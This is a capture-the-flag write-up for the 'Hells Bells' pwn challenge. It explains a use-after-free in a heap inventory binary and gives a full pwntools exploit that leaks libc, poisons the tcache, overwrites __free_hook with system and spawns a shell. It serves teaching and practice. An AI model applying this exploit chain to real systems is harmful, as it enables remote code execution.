+++
draft = false
title = 'Hells Bells'
category = 'Pwn'
+++

> Our breaching team keeps its charges in a little inventory manager. Plant a charge, rewire it, inspect it, defuse it when you're done. Standard issue.
> The quartermaster swears the thing is safe — "you can't touch a charge once it's defused." He's wrong about that, and about a few other things. Get a shell on the box.

<!--more-->

**Category:** Pwn  
**Points:** 448  
**Event:** CSAW 2026  

---

## Files

- `thermite-charge` — x86-64 ELF binary
- `libc-2.31.so` — glibc 2.31
- `ld-2.31.so` — matching dynamic linker
- `Dockerfile` — server runs via socat on port 1024

---

## Binary Analysis

```bash
$ file thermite-charge
thermite-charge: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

### Protections

| Protection  | Status   |
|-------------|----------|
| PIE         | Enabled  |
| Full RELRO  | Enabled  |
| Stack Canary| Disabled |
| NX          | Enabled  |

### Program Overview

The binary is a heap-based inventory manager for "thermite charges" with 5 options:

```
=== Thermite Charge Inventory ===
1) plant charge
2) defuse charge
3) rewire charge
4) inspect charge
5) leave
```

Internally it maintains two global arrays in BSS:

- `charges[16]` — heap pointers to each charge's payload
- `sizes[16]`   — size of each charge's payload

The operations map to:

| Option  | Action                                      |
|---------|---------------------------------------------|
| plant   | `malloc(size)`, store ptr + size, read data |
| defuse  | `free(charges[slot])`                       |
| rewire  | `read_n(charges[slot], sizes[slot])`        |
| inspect | `write(1, charges[slot], sizes[slot])`      |

---

## Vulnerability — Use After Free

The **defuse** handler calls `free(charges[slot])` but **never nulls out** `charges[slot]` or `sizes[slot]` afterward.

This means:

- **inspect** after defuse → read from freed memory (info leak)
- **rewire** after defuse → write to freed memory (corruption)

The quartermaster claimed "you can't touch a charge once it's defused." Both `rewire` and `inspect` check `charges[slot] != NULL` before proceeding — but since the pointer is never cleared, that check always passes on a freed chunk.

---

## Exploitation

### Environment

- glibc 2.31
- tcache enabled (per-thread cache, 7 bins per size)
- `__free_hook` available (pre-glibc 2.34)
- NX enabled, so we need a libc gadget not shellcode

### Strategy

1. **Leak libc** via unsorted bin fd pointer (inspect-after-free)
2. **Tcache poison** via UAF write to redirect a future allocation to `__free_hook`
3. **Write `system`** to `__free_hook`
4. **Free a chunk** containing `/bin/sh` → `system("/bin/sh")`

---

### Step 1: Libc Leak

Chunks larger than `0x408` bytes bypass the tcache and go directly to the unsorted bin on free. When a single chunk sits in the unsorted bin, its `fd` and `bk` pointers both point to `main_arena+0x60` inside libc.

```python
plant(0, 0x500)      # large chunk, will go to unsorted bin
plant(1, 0x20)       # fence chunk to prevent merging with top chunk
defuse(0)            # free -> unsorted bin; charges[0] NOT nulled
raw = inspect(0, 8)  # UAF read: fd pointer = main_arena+0x60
leak = u64(raw[:8])
libc_base = leak - 0x1ecbe0
```

The `inspect` output is prefixed with `payload: ` by the binary, so we skip those 9 bytes and read the 8-byte pointer directly.

```
libc base   = 0x7ff5729cd000
__free_hook = libc_base + 0x1eee48
system      = libc_base + 0x52290
```

---

### Step 2: Tcache Poisoning

In glibc 2.31, the tcache is a singly-linked list per chunk size. The `fd` pointer of a freed tcache chunk points to the next free chunk. By overwriting that `fd` via a UAF write, we can make the next `malloc` of that size return an arbitrary address.

```python
plant(2, 0x40)   # chunk A
plant(3, 0x40)   # chunk B

defuse(2)        # tcache[0x50]: [A]
defuse(3)        # tcache[0x50]: [B -> A]

# UAF write: overwrite fd of chunk B (top of tcache) with __free_hook address
# Must pad to full size (0x40) since read_n reads sizes[slot] bytes
rewire(3, p64(free_hook), 0x40)

plant(4, 0x40)               # pops B from tcache (legitimate)
plant(5, 0x40, p64(system))  # pops __free_hook from tcache, writes system() there
```

After `plant(5)`, `__free_hook` contains the address of `system`.

---

### Step 3: Shell

With `__free_hook = system`, any call to `free(ptr)` becomes `system(ptr)`. We just need to free a chunk whose first 8 bytes are `/bin/sh`.

```python
plant(6, 0x40, b'/bin/sh\x00')
defuse(6, final=True)  # free("/bin/sh") -> system("/bin/sh")
```

The `final=True` flag skips waiting for the next menu prompt, since the process is now a shell.

---

### Getting the Flag

```
[+] Opening connection to 10.0.184.144 on port 1024: Done
[*] Leaking libc...
[+] libc base = 0x7ff5729cd000
[*] Poisoning tcache...
[*] Popping shell...
[*] Switching to interactive mode
$ cat flag.txt
csaw{wh3n_y0u_r34ch_th3_cr0ssr04ds_d0nt_turn_l3ft}
```

---

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *

ADDRESS = "10.0.184.144"
PORT = 1024

LIBC_UNSORTED_BIN = 0x1ecbe0
LIBC_FREE_HOOK   = 0x1eee48
LIBC_SYSTEM      = 0x52290

p = remote(ADDRESS, PORT)

def menu():
    p.recvuntil(b'> ')

def plant(slot, size, data=None):
    p.sendline(b'1')
    p.recvuntil(b'): ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'payload: ')
    if data is None:
        data = b'A' * size
    data = (data + b'\x00' * size)[:size]
    p.send(data)
    menu()

def defuse(slot, final=False):
    p.sendline(b'2')
    p.recvuntil(b'slot: ')
    p.sendline(str(slot).encode())
    if not final:
        menu()

def rewire(slot, data, size):
    p.sendline(b'3')
    p.recvuntil(b'slot: ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'payload: ')
    data = (data + b'\x00' * size)[:size]
    p.send(data)
    menu()

def inspect(slot, n):
    p.sendline(b'4')
    p.recvuntil(b'slot: ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'payload: ')
    data = p.recv(n, timeout=5)
    menu()
    return data

menu()

log.info('Leaking libc...')
plant(0, 0x500)
plant(1, 0x20)
defuse(0)
raw = inspect(0, 8)
leak = u64(raw[:8])
libc_base = leak - LIBC_UNSORTED_BIN
log.success(f'libc base = {hex(libc_base)}')
assert libc_base & 0xfff == 0, f'bad leak: {hex(leak)}'

free_hook = libc_base + LIBC_FREE_HOOK
system    = libc_base + LIBC_SYSTEM

log.info('Poisoning tcache...')
plant(2, 0x40)
plant(3, 0x40)
defuse(2)
defuse(3)
rewire(3, p64(free_hook), 0x40)
plant(4, 0x40)
plant(5, 0x40, p64(system))

log.info('Popping shell...')
plant(6, 0x40, b'/bin/sh\x00')
defuse(6, final=True)

p.interactive()
```

---

## Summary

| Step | Technique                          | Purpose                          |
|------|------------------------------------|----------------------------------|
| 1    | UAF read on unsorted bin chunk     | Leak libc base address           |
| 2    | UAF write on tcache fd pointer     | Redirect malloc to `__free_hook` |
| 3    | Overwrite `__free_hook` with system| Hook free() to call system()     |
| 4    | Free chunk containing `/bin/sh`    | Trigger system("/bin/sh")        |

The quartermaster was wrong on both counts.
